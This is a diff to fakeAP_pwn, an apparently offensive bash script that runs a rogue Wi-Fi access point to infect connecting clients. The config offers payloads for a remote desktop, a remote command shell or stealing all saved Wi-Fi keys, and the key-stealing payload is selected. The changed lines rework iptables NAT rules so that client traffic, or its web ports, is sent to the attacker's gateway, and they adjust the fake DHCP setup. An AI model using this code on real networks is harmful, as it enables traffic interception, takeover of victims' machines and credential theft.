@@ -39,7 +39,7 @@ fakeAPchannel=1
 apType=airbase-ng
 
 # [normal/transparent/non] - Normal = Doesn't force them, just sniff. Transparent = after been infected gives them internet. non = No internet access afterwards
-apMode=transparent
+apMode=normal
 
 # [sbd/vnc/wkv/other] What to upload to the user. vnc=remote desktop, sbd=cmd line, wkv=Steal all WiFi keys
 payload=wkv
@@ -1030,7 +1030,7 @@ subnet 10.0.0.0 netmask 255.255.255.0 {
   option broadcast-address 10.0.0.255;
   option domain-name \"Home.com\";
   option domain-name-servers 10.0.0.1;
-  option netbios-name-servers 10.0.0.100; # or $gatewayIP?
+  option netbios-name-servers 10.0.0.100; 
 }" >> /tmp/fakeAP_pwn.dhcp
 if [ "$verbose" == "2" ]  ; then echo "Created: /tmp/fakeAP_pwn.dhcp"; fi
 if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.dhcp; fi
@@ -1238,20 +1238,20 @@ if [ "$apType" == "airbase-ng" ] ; then
          if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi;
          cleanup
       fi
-   sleep 3
-   done # Main Loop
-   if [ $loopMain == "False" ] ; then
-      display error "Couldn't detect the fake access point." $diagnostics 1>&2
-      #cleanup
-   fi
-elif [ "$apType" == "hostapd" ] ; then
-   action "Fake Access Point" "hostapd /tmp/fakeAP_pwn.hostapd" $verbose $diagnostics "true" $debug 10 0 4 & # Dont wait, do the next command
-   sleep 3
-   if [ -z "$(pgrep hostapd)" ] ; then
+         sleep 3
+         done # Main Loop
+      if [ $loopMain == "False" ] ; then
+         display error "Couldn't detect the fake access point." $diagnostics 1>&2
+         #cleanup
+      fi
+      elif [ "$apType" == "hostapd" ] ; then
+      action "Fake Access Point" "hostapd /tmp/fakeAP_pwn.hostapd" $verbose $diagnostics "true" $debug 10 0 4 & # Dont wait, do the next command
+      sleep 3
+      if [ -z "$(pgrep hostapd)" ] ; then
       display error "hostapd failed to start." $diagnostics 1>&2
       if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi; if [ "$diagnostics" == "true" ] ; then echo "killall xterm" >> fakeAP_pwn.log; fi
       cleanup
-   fi
+      fi
 fi
 
 if [ "$diagnostics" == "true" ] ; then
@@ -1279,12 +1279,23 @@ fi
 if [ "$apMode" == "normal" ] ; then
    iptables --table nat --append POSTROUTING --out-interface $interface --jump MASQUERADE
    iptables --append FORWARD --in-interface $apInterface --jump ACCEPT
-   iptables --table nat --append PREROUTING --proto udp --destination-port 53 --jump DNAT --to-destination $gatewayIP
-   #iptables --table nat --append PREROUTING --proto all --jump DNAT --to-destination $gatewayIP
-   #iptables --append INPUT -m iprange --src-range 10.0.0.150-10.0.0.250 --in-interface $apInterface --to-destination $gatewayIP --proto all -j DROP  # Protect the gateway
-elif [ "$apMode" == "transparent" ] || [ "$apMode" == "non" ] ; then
-   iptables --table nat --append PREROUTING --in-interface $apInterface --jump REDIRECT
-   iptables --table nat --append PREROUTING --proto tcp --jump DNAT --to-destination 10.0.0.1          # Blackhole Routing - Send everything to that IP address
+   iptables --table nat --append PREROUTING --jump DNAT --to-destination $gatewayIP
+   #iptables --table nat --append PREROUTING --proto udp --destination-port 53 --jump DNAT --to-destination $gatewayIP #only DNS
+   #iptables --table nat --append PREROUTING --proto tcp --destination-port 53 --jump DNAT --to-destination $gatewayIP #tcp and udp can be used to transfer dns
+   iptables -A INPUT -m iprange --src-range 10.0.0.150-10.0.0.250 --in-interface $apInterface --to-destination $gatewayIP -j DROP # protect our internet gateway
+elif [ "$apMode" == "non" ] || [ "$apMode" == "transparent" ] ; then
+   #iptables -A INPUT -p udp -i $apInterface --dport 53 -j ACCEPT
+   #iptables -A INPUT -p tcp -i $apInterface --dport 53 -j ACCEPT
+   #iptables -A INPUT -p tcp -i $apInterface --dport 80 -j ACCEPT
+   #iptables -A INPUT -p tcp -i $apInterface --dport 443 -j ACCEPT
+   #iptables -A INPUT -p tcp -i $apInterface --dport 4564 -j ACCEPT
+   #iptables -A INPUT -p udp -i $apInterface --dport 4564 -j ACCEPT
+   #iptables -A INPUT -p tcp -i $apInterface --dport $port -j ACCEPT
+   #iptables -A INPUT -p udp -i $apInterface --dport $port -j ACCEPT
+   #iptables -A INPUT -i $apInterface -j DROP # drop all other traffic
+   iptables --table nat --append PREROUTING --in-interface $apInterface --jump REDIRECT # Blackhole Routing
+   iptables -t nat -A PREROUTING -i $apInterface -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1
+   iptables -t nat -A PREROUTING -i $apInterface -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1
 fi
 
 # DHCP
@@ -1405,8 +1416,9 @@ fi
       fi
       iptables --table nat --append POSTROUTING --out-interface $interface --jump MASQUERADE
       iptables --append FORWARD --in-interface $apInterface --jump ACCEPT
-      iptables --table nat --append PREROUTING --proto all --jump DNAT --to-destination $gatewayIP
+      iptables --table nat --append PREROUTING --jump DNAT --to-destination $gatewayIP
       #iptables --table nat --append PREROUTING --proto udp --destination-port 53 --jump DNAT --to-destination $gatewayIP
+      #iptables --table nat --append PREROUTING --proto tcp --destination-port 53 --jump DNAT --to-destination $gatewayIP
       iptables --append INPUT -m iprange --src-range 10.0.0.150-10.0.0.250 --in-interface $apInterface --to-destination $gatewayIP --proto all -j DROP  # Protect the gateway
    fi
 
@@ -1418,7 +1430,7 @@ fi
    fi
 
 #----------------------------------------------------------------------------------------------#
-elif [ "$apMode" == "normal" ] ; then
+   elif [ "$apMode" == "normal" ] ; then
    if [ "$debug" == "true" ] || [ "$verbose" == "2" ] || [ "$diagnostics" == "true" ] ; then
       action "Connections" "watch -d -n 1 \"arp -n -v -i $apInterface\"" $verbose $diagnostics "true" $debug 10 475 5 & # Dont wait, do the next command
    fi
